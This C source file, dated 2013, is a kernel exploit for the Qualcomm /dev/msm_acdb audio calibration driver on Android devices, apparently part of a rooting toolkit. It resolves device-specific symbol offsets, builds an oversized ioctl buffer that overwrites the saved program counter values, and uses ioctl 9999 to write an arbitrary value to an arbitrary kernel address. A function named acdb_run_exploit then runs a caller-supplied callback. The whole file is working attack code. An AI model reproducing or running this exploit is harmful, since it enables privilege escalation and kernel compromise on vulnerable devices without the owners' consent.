/*
 *  Copyright (c) 2013 goroh_kun
 *
 *  2013/03/23
 *  goroh.kun@gmail.com
 */

#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#include <device_database.h>
#include "acdb.h"

typedef struct _param_pair {
  int pos;
  unsigned long int value;
} param_pair;

typedef struct _acdb_param {
  int value_pos;
  int address_pos;
  param_pair pc1;
  param_pair pc2;
} acdb_param;

static const acdb_param *
get_acdb_param(void)
{
  static acdb_param param;

  param.value_pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.value_pos));
  param.address_pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.address_pos));
  param.pc1.pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc1.pos));
  param.pc1.value = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc1.value));
  param.pc2.pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc2.pos));
  param.pc2.value = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc2.value));

  if (param.value_pos
   && param.address_pos
   && param.pc1.pos
   && param.pc1.value
   && param.pc2.pos
   && param.pc2.value) {
    return &param;
  }

  print_reason_device_not_supported();
  return NULL;
}

#define OVERFLOW_BUFFER_SIZE  0x100

struct acdb_ioctl {
    unsigned int size;
    char data[OVERFLOW_BUFFER_SIZE];
};

static int
write_value(const acdb_param *param, unsigned long address, unsigned long value)
{
    const char *device_name = "/dev/msm_acdb";
    struct acdb_ioctl arg;

    int fd;
    int ret;
    int i;

    fd = open(device_name, O_RDONLY);
    if (fd < 0) {
      printf("failed to open %s due to %s.\n", device_name, strerror(errno));
      return -1;
    }

    arg.size = param->pc2.pos + 4;

    for (i = 0; i < arg.size; i += 4) {
      *(unsigned long int *)&arg.data[i] = i;
    }

    *(unsigned long int *)&arg.data[param->address_pos] = address;
    *(unsigned long int *)&arg.data[param->value_pos] = value;
    *(unsigned long int *)&arg.data[param->pc1.pos] = param->pc1.value;
    *(unsigned long int *)&arg.data[param->pc2.pos] = param->pc2.value;

    ret = ioctl(fd, 9999, &arg);
    close(fd);

    return 0;
}

bool
acdb_write_value_at_address(unsigned long address, int value)
{
  const acdb_param *param = get_acdb_param();
  if (!param) {
    return false;
  }

  if (!write_value(param, address, value)) {
    return true;
  }

  return false;
}

bool
acdb_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!acdb_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
